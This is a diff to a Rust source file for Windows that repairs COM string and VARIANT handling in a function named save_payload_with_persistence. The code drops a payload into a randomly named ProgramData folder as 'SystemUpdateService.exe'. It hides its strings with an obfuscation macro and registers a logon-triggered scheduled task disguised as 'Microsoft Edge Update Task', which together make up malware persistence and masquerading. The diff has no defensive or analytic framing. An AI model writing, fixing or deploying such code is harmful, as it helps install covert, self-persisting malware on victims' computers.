@@ -8,13 +8,11 @@ use std::{mem, ptr};
 #[cfg(windows)]
 use hex::ToHex;
 #[cfg(windows)]
-use rand::Rng;
+use rand::{Rng, thread_rng};
 #[cfg(windows)]
 use std::fs;
 #[cfg(windows)]
-use windows_sys::Win32::Storage::FileSystem::{
-    FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_SHARE_WRITE,
-};
+use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN;
 #[cfg(windows)]
 use windows_sys::Win32::Foundation::HANDLE;
 #[cfg(windows)]
@@ -32,11 +30,9 @@ use winapi::um::winnt::{
 };
 
 #[cfg(windows)]
-use windows_sys::core::{BSTR, VARIANT};
-#[cfg(windows)]
 use windows_sys::Win32::System::Com::{
     CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
-    SysFreeString,
+    SysAllocString, SysFreeString,
 };
 #[cfg(windows)]
 use windows_sys::Win32::System::TaskScheduler::{
@@ -44,6 +40,9 @@ use windows_sys::Win32::System::TaskScheduler::{
     ITaskService, ITriggerCollection, TaskScheduler, TASK_ACTION_EXEC, TASK_CREATE_OR_UPDATE,
     TASK_LOGON_INTERACTIVE_TOKEN, TASK_RUNLEVEL_LUA, TASK_TRIGGER_LOGON,
 };
+#[cfg(windows)]
+use windows_sys::Win32::System::Variant::VARIANT;
+
 
 #[cfg(windows)]
 // COM Pointer wrapper for automatic Release
@@ -59,6 +58,7 @@ impl<T> Drop for ComPtr<T> {
         }
     }
 }
+
 
 // PE Header structures
 #[repr(C)]
@@ -344,7 +344,7 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
         program_data.pop();
     }
 
-    let mut rng = rand::thread_rng();
+    let mut rng = thread_rng();
     let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
     let dir_name: String = random_bytes.encode_hex();
     let exe_name = obfuscate_string!("SystemUpdateService.exe");
@@ -418,7 +418,7 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
     }
 
     // COM-based Task Scheduler
-    if CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED) < 0 {
+    if CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED as u32) < 0 {
         return Err(obfuscate_string!("Failed to initialize COM.").to_string());
     }
 
@@ -439,22 +439,22 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
     });
 
     (*task_service.0).Connect(
-        VARIANT { vt: 0 },
-        VARIANT { vt: 0 },
-        VARIANT { vt: 0 },
-        VARIANT { vt: 0 },
+        mem::zeroed(),
+        mem::zeroed(),
+        mem::zeroed(),
+        mem::zeroed(),
     );
 
     let root_folder = ComPtr({
         let mut folder = ptr::null_mut();
         let root_folder_name: Vec<u16> = "\\".encode_utf16().collect();
-        let root_folder_bstr = BSTR::from_wide(&root_folder_name);
-        if (*task_service.0).GetFolder(root_folder_bstr.as_raw(), &mut folder) < 0 {
-            SysFreeString(root_folder_bstr.as_raw());
+        let root_folder_bstr = SysAllocString(root_folder_name.as_ptr());
+        if (*task_service.0).GetFolder(root_folder_bstr, &mut folder) < 0 {
+            SysFreeString(root_folder_bstr);
             CoUninitialize();
             return Err(obfuscate_string!("Failed to get root task folder.").to_string());
         }
-        SysFreeString(root_folder_bstr.as_raw());
+        SysFreeString(root_folder_bstr);
         folder
     });
 
@@ -504,24 +504,24 @@ unsafe fn save_payload_with_persistence() -> Result<(), String> {
         a as *mut IExecAction
     });
 
-    let path_bstr = BSTR::from_wide(full_file_path_win.encode_utf16().collect::<Vec<u16>>().as_slice());
-    (*action.0).put_Path(path_bstr.as_raw());
-    SysFreeString(path_bstr.as_raw());
+    let path_bstr = SysAllocString(full_file_path_win.encode_utf16().collect::<Vec<u16>>().as_ptr());
+    (*action.0).put_Path(path_bstr);
+    SysFreeString(path_bstr);
 
-    let task_name_bstr = BSTR::from_wide(obfuscate_string!("Microsoft Edge Update Task").encode_utf16().collect::<Vec<u16>>().as_slice());
+    let task_name_bstr = SysAllocString(obfuscate_string!("Microsoft Edge Update Task").encode_utf16().collect::<Vec<u16>>().as_ptr());
     let registered_task = ComPtr({
         let mut rt = ptr::null_mut();
         let result = (*root_folder.0).RegisterTaskDefinition(
-            task_name_bstr.as_raw(),
+            task_name_bstr,
             task_definition.0,
             TASK_CREATE_OR_UPDATE as i32,
-            VARIANT { vt: 0 },
-            VARIANT { vt: 0 },
+            mem::zeroed(),
+            mem::zeroed(),
             TASK_LOGON_INTERACTIVE_TOKEN,
-            VARIANT { vt: 0 },
+            mem::zeroed(),
             &mut rt,
         );
-        SysFreeString(task_name_bstr.as_raw());
+        SysFreeString(task_name_bstr);
         if result < 0 {
             CoUninitialize();
             return Err(format!("{}{:x}", obfuscate_string!("Failed to register task: "), result));
